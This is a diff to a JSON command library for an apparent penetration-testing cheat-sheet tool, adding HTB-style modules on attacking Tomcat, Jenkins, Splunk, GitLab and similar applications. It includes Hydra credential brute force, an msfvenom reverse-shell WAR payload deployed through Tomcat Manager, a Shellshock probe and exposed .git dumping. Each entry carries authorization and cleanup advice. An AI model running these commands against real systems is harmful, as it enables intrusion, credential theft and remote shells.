@@ -64,6 +64,9 @@
       "Focused Vulnerability Checks",
       "Authentication Testing",
       "Stack-Specific Validation",
+      "Common Application Servers",
+      "Infrastructure & Support Apps",
+      "Thick Client & Code Review",
       "Active Directory Enumeration",
       "Kerberos & Relay",
       "Coercion & Name Resolution Abuse",
@@ -244,7 +247,9 @@
           "qsreplace",
           "gf",
           "HTTP Request Smuggler",
-          "DOM Invader"
+          "DOM Invader",
+          "searchsploit",
+          "IIS ShortName Scanner"
         ]
       },
       {
@@ -404,7 +409,8 @@
         "tools": [
           "WPScan",
           "Joomscan",
-          "Droopescan"
+          "Droopescan",
+          "CMSeeK"
         ]
       },
       {
@@ -456,6 +462,49 @@
           "httpx",
           "jq",
           "SecLists"
+        ]
+      },
+      {
+        "name": "Common Application Servers",
+        "path": "Validation & Attack Surface",
+        "summary": "Validate management surfaces and controlled deployment paths for Tomcat, Jenkins, CGI, and similar application-server targets.",
+        "tools": [
+          "Hydra",
+          "curl",
+          "Tomcat Manager API",
+          "msfvenom",
+          "Jenkins CLI",
+          "Nmap NSE",
+          "Burp Suite"
+        ]
+      },
+      {
+        "name": "Infrastructure & Support Apps",
+        "path": "Validation & Attack Surface",
+        "summary": "Review Splunk, PRTG, osTicket, GitLab, and other internal support platforms through their native APIs and repository workflows.",
+        "tools": [
+          "Splunk REST API",
+          "PRTG HTTP API",
+          "osTicket API",
+          "GitLab API",
+          "git",
+          "Gitleaks",
+          "git-dumper",
+          "GitTools",
+          "curl",
+          "jq"
+        ]
+      },
+      {
+        "name": "Thick Client & Code Review",
+        "path": "Validation & Attack Surface",
+        "summary": "Inspect thick clients, Java artifacts, captured traffic, and rebuilt client packages before testing server-side assumptions.",
+        "tools": [
+          "Wireshark",
+          "JD-GUI",
+          "jadx",
+          "JDK tools",
+          "Burp Suite"
         ]
       }
     ],
@@ -652,6 +701,78 @@
       {
         "label": "SecLists",
         "url": "https://github.com/danielmiessler/SecLists"
+      },
+      {
+        "label": "HTB Academy: Attacking Common Applications",
+        "url": "https://academy.hackthebox.com/course/preview/attacking-common-applications/introduction-to-attacking-common-applications"
+      },
+      {
+        "label": "CMSeeK",
+        "url": "https://github.com/Tuhinshubhra/CMSeeK"
+      },
+      {
+        "label": "Jenkins CLI",
+        "url": "https://www.jenkins.io/doc/book/managing/cli/"
+      },
+      {
+        "label": "Splunk REST API",
+        "url": "https://docs.splunk.com/Documentation/Splunk/9.4.2/RESTUM/RESTusing"
+      },
+      {
+        "label": "Splunk app.conf",
+        "url": "https://docs.splunk.com/Documentation/Splunk/latest/admin/appconf"
+      },
+      {
+        "label": "PRTG HTTP API",
+        "url": "https://www.paessler.com/manuals/prtg/http_api"
+      },
+      {
+        "label": "osTicket API",
+        "url": "https://docs.osticket.com/en/latest/Developer%20Documentation/API%20Docs.html"
+      },
+      {
+        "label": "GitLab Projects API",
+        "url": "https://docs.gitlab.com/api/projects/"
+      },
+      {
+        "label": "GitLab Token Scopes",
+        "url": "https://docs.gitlab.com/user/profile/personal_access_tokens/"
+      },
+      {
+        "label": "Gitleaks",
+        "url": "https://github.com/gitleaks/gitleaks"
+      },
+      {
+        "label": "git-dumper",
+        "url": "https://github.com/arthaud/git-dumper"
+      },
+      {
+        "label": "GitTools",
+        "url": "https://github.com/internetwache/GitTools"
+      },
+      {
+        "label": "JD-GUI",
+        "url": "https://github.com/java-decompiler/jd-gui"
+      },
+      {
+        "label": "jadx",
+        "url": "https://github.com/skylot/jadx"
+      },
+      {
+        "label": "IIS ShortName Scanner",
+        "url": "https://github.com/irsdl/IIS-ShortName-Scanner"
+      },
+      {
+        "label": "Nmap http-iis-short-name-brute",
+        "url": "https://nmap.org/nsedoc/scripts/http-iis-short-name-brute.html"
+      },
+      {
+        "label": "Kali exploitdb/searchsploit",
+        "url": "https://www.kali.org/tools/exploitdb/"
+      },
+      {
+        "label": "Kali Wireshark",
+        "url": "https://www.kali.org/tools/wireshark/"
       }
     ],
     "tool_profiles": [
@@ -664,6 +785,11 @@
         "name": "Amass",
         "manual_label": "Amass Docs",
         "manual_url": "https://owasp-amass.github.io/docs/"
+      },
+      {
+        "name": "Aquatone",
+        "manual_label": "Aquatone",
+        "manual_url": "https://github.com/michenriksen/aquatone"
       },
       {
         "name": "bash",
@@ -709,6 +835,11 @@
         "name": "Clairvoyance",
         "manual_label": "Clairvoyance",
         "manual_url": "https://github.com/nikitastupin/clairvoyance"
+      },
+      {
+        "name": "CMSeeK",
+        "manual_label": "CMSeeK",
+        "manual_url": "https://github.com/Tuhinshubhra/CMSeeK"
       },
       {
         "name": "Coercer",
@@ -766,19 +897,14 @@
         "manual_url": "https://github.com/cddmp/enum4linux-ng"
       },
       {
-        "name": "EyeWitness",
-        "manual_label": "Kali EyeWitness",
-        "manual_url": "https://www.kali.org/tools/eyewitness/"
-      },
-      {
         "name": "exiftool",
         "manual_label": "ExifTool",
         "manual_url": "https://exiftool.org/"
       },
       {
-        "name": "Aquatone",
-        "manual_label": "Aquatone",
-        "manual_url": "https://github.com/michenriksen/aquatone"
+        "name": "EyeWitness",
+        "manual_label": "Kali EyeWitness",
+        "manual_url": "https://www.kali.org/tools/eyewitness/"
       },
       {
         "name": "Feroxbuster",
@@ -836,6 +962,31 @@
         "manual_url": "https://github.com/tomnomnom/gf"
       },
       {
+        "name": "git",
+        "manual_label": "Git Docs",
+        "manual_url": "https://git-scm.com/docs"
+      },
+      {
+        "name": "git-dumper",
+        "manual_label": "git-dumper",
+        "manual_url": "https://github.com/arthaud/git-dumper"
+      },
+      {
+        "name": "GitLab API",
+        "manual_label": "GitLab Projects API",
+        "manual_url": "https://docs.gitlab.com/api/projects/"
+      },
+      {
+        "name": "Gitleaks",
+        "manual_label": "Gitleaks",
+        "manual_url": "https://github.com/gitleaks/gitleaks"
+      },
+      {
+        "name": "GitTools",
+        "manual_label": "GitTools",
+        "manual_url": "https://github.com/internetwache/GitTools"
+      },
+      {
         "name": "Gobuster",
         "manual_label": "Gobuster",
         "manual_url": "https://github.com/OJ/gobuster"
@@ -881,6 +1032,11 @@
         "manual_url": "https://github.com/vanhauser-thc/thc-hydra"
       },
       {
+        "name": "IIS ShortName Scanner",
+        "manual_label": "IIS ShortName Scanner",
+        "manual_url": "https://github.com/irsdl/IIS-ShortName-Scanner"
+      },
+      {
         "name": "impacket-smbserver",
         "manual_label": "smbserver.py",
         "manual_url": "https://github.com/fortra/impacket/blob/master/examples/smbserver.py"
@@ -904,6 +1060,26 @@
         "name": "ipconfig",
         "manual_label": "Microsoft Learn",
         "manual_url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig"
+      },
+      {
+        "name": "jadx",
+        "manual_label": "jadx",
+        "manual_url": "https://github.com/skylot/jadx"
+      },
+      {
+        "name": "JD-GUI",
+        "manual_label": "JD-GUI",
+        "manual_url": "https://github.com/java-decompiler/jd-gui"
+      },
+      {
+        "name": "JDK tools",
+        "manual_label": "OpenJDK tools",
+        "manual_url": "https://openjdk.org/tools/"
+      },
+      {
+        "name": "Jenkins CLI",
+        "manual_label": "Jenkins CLI",
+        "manual_url": "https://www.jenkins.io/doc/book/managing/cli/"
       },
       {
         "name": "john",
@@ -1031,6 +1207,11 @@
         "manual_url": "https://docs.openssl.org/"
       },
       {
+        "name": "osTicket API",
+        "manual_label": "osTicket API",
+        "manual_url": "https://docs.osticket.com/en/latest/Developer%20Documentation/API%20Docs.html"
+      },
+      {
         "name": "OWASP ZAP",
         "manual_label": "OWASP ZAP",
         "manual_url": "https://www.zaproxy.org/docs/"
@@ -1069,6 +1250,11 @@
         "name": "proxychains",
         "manual_label": "proxychains-ng",
         "manual_url": "https://github.com/rofl0r/proxychains-ng"
+      },
+      {
+        "name": "PRTG HTTP API",
+        "manual_label": "PRTG HTTP API",
+        "manual_url": "https://www.paessler.com/manuals/prtg/http_api"
       },
       {
         "name": "ps",
@@ -1114,6 +1300,11 @@
         "name": "schtasks",
         "manual_label": "Microsoft Learn",
         "manual_url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query"
+      },
+      {
+        "name": "searchsploit",
+        "manual_label": "Kali exploitdb",
+        "manual_url": "https://www.kali.org/tools/exploitdb/"
       },
       {
         "name": "SecLists",
@@ -1166,6 +1357,11 @@
         "manual_url": "https://www.gnu.org/software/coreutils/manual/html_node/sort-invocation.html"
       },
       {
+        "name": "Splunk REST API",
+        "manual_label": "Splunk REST API",
+        "manual_url": "https://docs.splunk.com/Documentation/Splunk/9.4.2/RESTUM/RESTusing"
+      },
+      {
         "name": "sqlmap",
         "manual_label": "sqlmap Wiki",
         "manual_url": "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
@@ -1216,6 +1412,11 @@
         "manual_url": "https://github.com/projectdiscovery/subfinder"
       },
       {
+        "name": "Tomcat Manager API",
+        "manual_label": "Tomcat Manager",
+        "manual_url": "https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html"
+      },
+      {
         "name": "Wappalyzer",
         "manual_label": "Wappalyzer",
         "manual_url": "https://github.com/tomnomnom/wappalyzer"
@@ -1239,6 +1440,11 @@
         "name": "winPEAS",
         "manual_label": "PEASS-ng",
         "manual_url": "https://github.com/peass-ng/PEASS-ng"
+      },
+      {
+        "name": "Wireshark",
+        "manual_label": "Wireshark",
+        "manual_url": "https://www.wireshark.org/docs/"
       },
       {
         "name": "wmiexec.py",
@@ -6011,6 +6217,628 @@
       "help_menu": "Why: SPAWN is the execution step that converts the relay control path into local privileged code execution.\nRecord the impersonated user, certificate material, and output path so the action stays reviewable.",
       "reference_label": "KrbRelayUp",
       "reference_url": "https://github.com/Dec0ne/KrbRelayUp"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Stack-Specific Validation",
+      "tool": "CMSeeK",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Fingerprint a CMS Family Broadly",
+      "description": "Use CMSeeK when the target looks CMS-backed but WordPress, Joomla, or Drupal is not confirmed yet.",
+      "command": "python3 cmseek.py -u https://<TARGET> --follow-redirect -v",
+      "tip": "Use this as a routing tool: once the CMS is clear, switch to the focused scanner and manual checks for that platform.",
+      "tags": [
+        "htb-common-apps",
+        "cms",
+        "fingerprinting",
+        "wordpress",
+        "joomla",
+        "drupal"
+      ],
+      "help_menu": "Why: HTB common-app labs reward recognizing the product family early.\nUse after: basic HTTP fingerprinting and before app-specific scanners.",
+      "reference_label": "CMSeeK",
+      "reference_url": "https://github.com/Tuhinshubhra/CMSeeK"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Stack-Specific Validation",
+      "tool": "WPScan",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Enumerate WordPress with Vulnerability Metadata",
+      "description": "Add the WPScan API token when you want plugin, theme, and core findings correlated with WPScan vulnerability data.",
+      "command": "wpscan --url https://<TARGET> --enumerate vp,vt,u --plugins-detection aggressive --api-token <TOKEN>",
+      "tip": "The token enriches results; you still need to confirm version reachability and exploitability manually.",
+      "tags": [
+        "htb-common-apps",
+        "wordpress",
+        "wpscan",
+        "cms"
+      ],
+      "help_menu": "Why: the HTB WordPress sections lean on plugin/theme/user visibility.\nRecord: exact plugin version, theme version, and the evidence URL for each claim.",
+      "reference_label": "WPScan CLI",
+      "reference_url": "https://wpscan.com/wordpress-cli-scanner/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Stack-Specific Validation",
+      "tool": "Joomscan",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Enumerate Joomla Components",
+      "description": "Use component enumeration when Joomla is confirmed and extension surface matters more than generic web fuzzing.",
+      "command": "joomscan -u https://<TARGET> --enumerate-components",
+      "tip": "Treat component names as leads for manual URL checks, version confirmation, and public exploit triage.",
+      "tags": [
+        "htb-common-apps",
+        "joomla",
+        "components",
+        "cms"
+      ],
+      "help_menu": "Why: Joomla extension exposure is usually where the interesting risk lives.\nFollow with: searchsploit, Nuclei, and manual route review.",
+      "reference_label": "Joomscan",
+      "reference_url": "https://github.com/OWASP/joomscan"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Focused Vulnerability Checks",
+      "tool": "searchsploit",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Search Public Exploits by Product Version",
+      "description": "Map a confirmed application name and version to local Exploit-DB entries before you choose any exploit path.",
+      "command": "searchsploit -s \"<PRODUCT>\" \"<VERSION>\"",
+      "tip": "Read the code and affected-version notes before running anything. Search results are leads, not proof.",
+      "tags": [
+        "htb-common-apps",
+        "exploitdb",
+        "cve",
+        "triage"
+      ],
+      "help_menu": "Why: common app modules often hinge on recognizing a vulnerable product/version.\nUse when: fingerprinting gives you a reliable version or CVE candidate.",
+      "reference_label": "Kali exploitdb",
+      "reference_url": "https://www.kali.org/tools/exploitdb/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Focused Vulnerability Checks",
+      "tool": "searchsploit",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Correlate SearchSploit with Nmap XML",
+      "description": "Let SearchSploit inspect saved Nmap XML when you want a quick public-exploit triage pass over discovered service versions.",
+      "command": "searchsploit --nmap <NMAP_XML>",
+      "tip": "This is a triage shortcut. Keep the original scan and manually review any exploit that looks relevant.",
+      "tags": [
+        "htb-common-apps",
+        "nmap",
+        "exploitdb",
+        "triage"
+      ],
+      "help_menu": "Why: version banners from Nmap are a natural input to public exploit lookup.\nWatch for: false positives caused by vague service names.",
+      "reference_label": "Kali exploitdb",
+      "reference_url": "https://www.kali.org/tools/exploitdb/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Focused Vulnerability Checks",
+      "tool": "Nmap NSE",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Check IIS Short Name Disclosure",
+      "description": "Use Nmap’s IIS short-name brute script as a first pass before moving to a dedicated scanner.",
+      "command": "nmap -p80,443 --script http-iis-short-name-brute <TARGET>",
+      "tip": "This script is intrusive/brute-category NSE content, so keep it scoped and expect false positives until you validate paths manually.",
+      "tags": [
+        "htb-common-apps",
+        "iis",
+        "tilde",
+        "nse"
+      ],
+      "help_menu": "Why: HTB’s IIS tilde section is about turning short-name clues into real filenames.\nUse after: confirming IIS and allowed testing scope.",
+      "reference_label": "Nmap NSE http-iis-short-name-brute",
+      "reference_url": "https://nmap.org/nsedoc/scripts/http-iis-short-name-brute.html"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Focused Vulnerability Checks",
+      "tool": "IIS ShortName Scanner",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Run a Dedicated IIS Short Name Scan",
+      "description": "Use the dedicated Java scanner when Nmap shows tilde disclosure or you need deeper candidate recovery.",
+      "command": "java -jar iis_shortname_scanner.jar 2 20 https://<TARGET>/",
+      "tip": "Start with a narrow path and compare results against normal 404/403 behavior before trusting candidate names.",
+      "tags": [
+        "htb-common-apps",
+        "iis",
+        "tilde",
+        "java"
+      ],
+      "help_menu": "Why: the dedicated scanner can dig deeper into IIS 8.3 filename behavior.\nValidate: recovered short names by targeted content discovery and manual requests.",
+      "reference_label": "IIS ShortName Scanner",
+      "reference_url": "https://github.com/irsdl/IIS-ShortName-Scanner"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Common Application Servers",
+      "tool": "Hydra",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Check Tomcat Manager Credentials Carefully",
+      "description": "Validate a focused credential list against the Tomcat Manager path after you confirm lockout and scope expectations.",
+      "command": "hydra -L users.txt -P passwords.txt -s 8080 -f <TARGET> http-get /manager/html",
+      "tip": "Use a tiny, justified list first. Tomcat Manager testing gets noisy quickly if you treat it like a generic password spray.",
+      "tags": [
+        "htb-common-apps",
+        "tomcat",
+        "manager",
+        "auth"
+      ],
+      "help_menu": "Why: Tomcat Manager access often decides whether deployment testing is possible.\nCheck before: lockouts, default credentials policy, and whether /manager is reachable.",
+      "reference_label": "THC Hydra",
+      "reference_url": "https://github.com/vanhauser-thc/thc-hydra"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Common Application Servers",
+      "tool": "Tomcat Manager API",
+      "platform": "HTTP",
+      "type": "Command",
+      "title": "List Tomcat Manager Applications",
+      "description": "Use the text manager endpoint to confirm credentials and see deployed paths without relying on the web UI.",
+      "command": "curl -sS -u <USER>:<PASSWORD> http://<TARGET>:8080/manager/text/list",
+      "tip": "The text endpoint is easier to save in notes and avoids confusing UI state with API-level authorization.",
+      "tags": [
+        "htb-common-apps",
+        "tomcat",
+        "manager",
+        "api"
+      ],
+      "help_menu": "Why: listing apps proves manager access and shows deployment paths.\nRecord: HTTP status, authenticated user context, and deployed paths.",
+      "reference_label": "Tomcat Manager HOWTO",
+      "reference_url": "https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Common Application Servers",
+      "tool": "msfvenom",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Build a Java WAR Payload for Lab Deployment",
+      "description": "Generate a WAR artifact when you have explicit authorization to validate a Tomcat-style deployment path.",
+      "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o app.war",
+      "tip": "Tie the artifact to the lab target and delete it after validation. Payload generation should be purposeful, not casual.",
+      "tags": [
+        "htb-common-apps",
+        "tomcat",
+        "war",
+        "payload"
+      ],
+      "help_menu": "Why: Tomcat-style manager access can become code execution through deployment features.\nUse only after: credentials, scope, and listener details are all clear.",
+      "reference_label": "msfvenom Docs",
+      "reference_url": "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Common Application Servers",
+      "tool": "Tomcat Manager API",
+      "platform": "HTTP",
+      "type": "Command",
+      "title": "Deploy a WAR Through Tomcat Manager",
+      "description": "Upload a prepared WAR to the text API in an authorized lab so you can prove whether manager deployment is exposed.",
+      "command": "curl -sS -u <USER>:<PASSWORD> --upload-file app.war \"http://<TARGET>:8080/manager/text/deploy?path=/app&update=true\"",
+      "tip": "Use a unique path, document it, and undeploy it when you are done testing.",
+      "tags": [
+        "htb-common-apps",
+        "tomcat",
+        "manager",
+        "deploy"
+      ],
+      "help_menu": "Why: deployment is the risky manager capability; test it only when it is the finding you need to prove.\nClean up: undeploy the app and save the response body.",
+      "reference_label": "Tomcat Manager HOWTO",
+      "reference_url": "https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Common Application Servers",
+      "tool": "Jenkins CLI",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Download Jenkins CLI Client",
+      "description": "Pull the Jenkins-distributed CLI JAR from the target controller so CLI behavior matches the server version.",
+      "command": "curl -sSLo jenkins-cli.jar http://<TARGET>:8080/jnlpJars/jenkins-cli.jar",
+      "tip": "Re-download the JAR from the controller you are testing instead of reusing a stale local copy.",
+      "tags": [
+        "htb-common-apps",
+        "jenkins",
+        "cli",
+        "java"
+      ],
+      "help_menu": "Why: Jenkins distributes the CLI client from the controller itself.\nUse for: permission checks, job listing, and scripted admin validation once authenticated.",
+      "reference_label": "Jenkins CLI",
+      "reference_url": "https://www.jenkins.io/doc/book/managing/cli/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Common Application Servers",
+      "tool": "Jenkins CLI",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Check Jenkins CLI Identity and Jobs",
+      "description": "Use the CLI to confirm authenticated identity and enumerate visible jobs before testing higher-impact Jenkins features.",
+      "command": "java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth <USER>:<TOKEN> who-am-i && java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth <USER>:<TOKEN> list-jobs",
+      "tip": "Use API tokens where possible and save the permission output with the credentials source.",
+      "tags": [
+        "htb-common-apps",
+        "jenkins",
+        "cli",
+        "jobs"
+      ],
+      "help_menu": "Why: identity and job visibility shape every later Jenkins test.\nRecord: authenticated user, authorities, visible jobs, and CLI transport mode.",
+      "reference_label": "Jenkins CLI",
+      "reference_url": "https://www.jenkins.io/doc/book/managing/cli/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Common Application Servers",
+      "tool": "Nmap NSE",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Probe CGI Shellshock with a Harmless Command",
+      "description": "Run the Shellshock NSE script against a known CGI path with a benign command so you can validate exposure before impact testing.",
+      "command": "nmap -p80 --script http-shellshock --script-args uri=<CGI_PATH>,cmd='echo htb' <TARGET>",
+      "tip": "Keep the command harmless until you have a stable signal and explicit permission to prove impact further.",
+      "tags": [
+        "htb-common-apps",
+        "cgi",
+        "shellshock",
+        "nse"
+      ],
+      "help_menu": "Why: CGI/Shellshock testing should start with controlled signal, not a full callback.\nUse after: discovering a real CGI endpoint and confirming it is in scope.",
+      "reference_label": "Nmap NSE",
+      "reference_url": "https://nmap.org/nsedoc/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "Splunk REST API",
+      "platform": "HTTP",
+      "type": "Command",
+      "title": "Request a Splunk Session Key",
+      "description": "Authenticate to Splunk’s management port and capture a session key for scoped REST API validation.",
+      "command": "curl -ks https://<TARGET>:8089/services/auth/login --data-urlencode username=<USER> --data-urlencode password='<PASSWORD>'",
+      "tip": "Management port 8089 is distinct from Splunk Web. Keep both endpoints straight in your notes.",
+      "tags": [
+        "htb-common-apps",
+        "splunk",
+        "rest",
+        "auth"
+      ],
+      "help_menu": "Why: Splunk REST access reveals role, app, and search capabilities through a cleaner interface than the UI.\nProtect: session keys are credentials; do not paste them into general notes.",
+      "reference_label": "Splunk REST API",
+      "reference_url": "https://docs.splunk.com/Documentation/Splunk/9.4.2/RESTUM/RESTusing"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "Splunk REST API",
+      "platform": "HTTP",
+      "type": "Command",
+      "title": "List Visible Splunk Apps",
+      "description": "Use a Splunk session key to list app context and permissions that matter before any app-install validation.",
+      "command": "curl -ks -H \"Authorization: Splunk <TOKEN>\" \"https://<TARGET>:8089/services/apps/local?output_mode=json\" | jq \".entry[].name\"",
+      "tip": "Focus on app visibility and role capability before thinking about package upload paths.",
+      "tags": [
+        "htb-common-apps",
+        "splunk",
+        "apps",
+        "rest"
+      ],
+      "help_menu": "Why: Splunk authorization is capability-driven, and app visibility helps explain what the account can really do.\nRecord: role/capability evidence before higher-impact tests.",
+      "reference_label": "Splunk REST API",
+      "reference_url": "https://docs.splunk.com/Documentation/Splunk/9.4.2/RESTUM/RESTusing"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "Splunk REST API",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Package a Minimal Splunk App",
+      "description": "Create a simple Splunk app archive for authorized install-path validation or defensive lab testing.",
+      "command": "tar --format ustar -czf <APP_NAME>.tar.gz <APP_NAME>/",
+      "tip": "A valid Splunk app layout matters. Keep app.conf metadata readable and avoid packing extra parent directories.",
+      "tags": [
+        "htb-common-apps",
+        "splunk",
+        "app",
+        "package"
+      ],
+      "help_menu": "Why: Splunk app install testing starts with a well-formed package.\nCheck: default/app.conf, bin scripts, package root, and cleanup plan.",
+      "reference_label": "Splunk app.conf",
+      "reference_url": "https://docs.splunk.com/Documentation/Splunk/latest/admin/appconf"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "PRTG HTTP API",
+      "platform": "HTTP",
+      "type": "Command",
+      "title": "List PRTG Sensors Through the API",
+      "description": "Use the PRTG HTTP API to enumerate sensors and object IDs once you have a valid API token.",
+      "command": "curl -ks -H \"Authorization: Bearer <TOKEN>\" \"https://<TARGET>/api/table.json?content=sensors&columns=objid,name,status,lastvalue\" | jq",
+      "tip": "Sensor names and notifications often reveal internal systems, service names, and operational trust boundaries.",
+      "tags": [
+        "htb-common-apps",
+        "prtg",
+        "api",
+        "monitoring"
+      ],
+      "help_menu": "Why: PRTG is a monitoring product, so the API can expose a map of internal assets and service health.\nRecord: token source, object IDs, and any sensitive naming.",
+      "reference_label": "PRTG HTTP API",
+      "reference_url": "https://www.paessler.com/manuals/prtg/http_api"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "osTicket API",
+      "platform": "HTTP",
+      "type": "Command",
+      "title": "Validate osTicket API Key Scope",
+      "description": "Send a minimal ticket creation request to confirm whether an osTicket API key is accepted from your source IP.",
+      "command": "curl -sS -H \"X-API-Key: <TOKEN>\" -H \"Content-Type: application/json\" -d @ticket.json https://<TARGET>/api/tickets.json",
+      "tip": "osTicket API keys are tied to source IP behavior, so note the network path used during testing.",
+      "tags": [
+        "htb-common-apps",
+        "osticket",
+        "api",
+        "support"
+      ],
+      "help_menu": "Why: helpdesk systems can contain sensitive conversations and upload flows.\nUse carefully: avoid creating noisy tickets outside a lab or explicit test window.",
+      "reference_label": "osTicket API",
+      "reference_url": "https://docs.osticket.com/en/latest/Developer%20Documentation/API%20Docs.html"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "GitLab API",
+      "platform": "HTTP",
+      "type": "Command",
+      "title": "List GitLab Projects Available to a Token",
+      "description": "Use the GitLab API to see which projects a token can read before cloning or scanning repositories.",
+      "command": "curl -sS --header \"PRIVATE-TOKEN: <TOKEN>\" \"https://<TARGET>/api/v4/projects?membership=true&simple=true&per_page=100\" | jq \".[].path_with_namespace\"",
+      "tip": "Token scope and project visibility are findings context; preserve both with the project list.",
+      "tags": [
+        "htb-common-apps",
+        "gitlab",
+        "api",
+        "projects"
+      ],
+      "help_menu": "Why: GitLab access often pivots from web auth into repository review.\nRecord: token source, token scope if known, project visibility, and project IDs.",
+      "reference_label": "GitLab Projects API",
+      "reference_url": "https://docs.gitlab.com/api/projects/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "git",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Clone a GitLab Repository with a Token",
+      "description": "Clone a repository for offline review when a scoped GitLab token has read_repository-style access.",
+      "command": "git clone https://oauth2:<TOKEN>@<TARGET>/<GROUP>/<PROJECT>.git <REPO_DIR>",
+      "tip": "Use a disposable workspace and remove tokens from shell history or remotes after cloning.",
+      "tags": [
+        "htb-common-apps",
+        "gitlab",
+        "git",
+        "repository"
+      ],
+      "help_menu": "Why: offline review makes it easier to search source, history, and CI configuration without poking the server repeatedly.\nCleanup: scrub token-bearing remote URLs from .git/config.",
+      "reference_label": "Git docs",
+      "reference_url": "https://git-scm.com/docs/git-clone"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "Gitleaks",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Scan a Cloned Repository for Secrets",
+      "description": "Run Gitleaks against a cloned GitLab or exposed repository to triage committed secrets across current files and history.",
+      "command": "gitleaks detect --source <REPO_DIR> --redact --report-format json --report-path gitleaks.json",
+      "tip": "Use redaction in shared notes, then store any confirmed secret evidence separately and carefully.",
+      "tags": [
+        "htb-common-apps",
+        "gitlab",
+        "secrets",
+        "gitleaks"
+      ],
+      "help_menu": "Why: common app paths often move from repository access to credentials or CI secrets.\nConfirm: whether each detected value is real, live, and in scope before reporting impact.",
+      "reference_label": "Gitleaks",
+      "reference_url": "https://github.com/gitleaks/gitleaks"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "git-dumper",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Recover an Exposed .git Directory",
+      "description": "Dump as much of a web-exposed .git directory as possible into a local repository workspace for review.",
+      "command": "git-dumper https://<TARGET>/.git/ <REPO_DIR>",
+      "tip": "The upstream README warns that attacker-controlled repositories can lead to local code execution; inspect in a disposable directory.",
+      "tags": [
+        "htb-common-apps",
+        "git",
+        "git-dumper",
+        "source"
+      ],
+      "help_menu": "Why: exposed .git folders can reveal source, history, and deleted secrets.\nAfter dumping: inspect remotes, config, logs, and history before running project code.",
+      "reference_label": "git-dumper",
+      "reference_url": "https://github.com/arthaud/git-dumper"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Infrastructure & Support Apps",
+      "tool": "GitTools",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Find and Extract Exposed Git Repositories",
+      "description": "Use GitTools when you want the classic finder/dumper/extractor workflow for exposed .git repositories.",
+      "command": "./Finder/gitfinder.py -i hosts.txt -o exposed-git.txt && ./Dumper/gitdumper.sh https://<TARGET>/.git/ <REPO_DIR> && ./Extractor/extractor.sh <REPO_DIR> extracted",
+      "tip": "Keep the stages separate in your notes so you know which host exposed metadata and which one yielded recoverable source.",
+      "tags": [
+        "htb-common-apps",
+        "git",
+        "source",
+        "GitTools"
+      ],
+      "help_menu": "Why: GitTools splits discovery, recovery, and object extraction into distinct steps.\nUse when: directory listing is partial or you need to reconstruct history from objects.",
+      "reference_label": "GitTools",
+      "reference_url": "https://github.com/internetwache/GitTools"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Thick Client & Code Review",
+      "tool": "Wireshark",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Capture Thick Client Traffic with tshark",
+      "description": "Record traffic for a thick client session so you can inspect protocols, ports, and request formats before modifying the client.",
+      "command": "tshark -i tun0 -f \"host <TARGET>\" -w thick-client.pcapng",
+      "tip": "Capture first, then replay. The protocol details usually explain where decompilation effort should go.",
+      "tags": [
+        "htb-common-apps",
+        "thick-client",
+        "traffic",
+        "wireshark"
+      ],
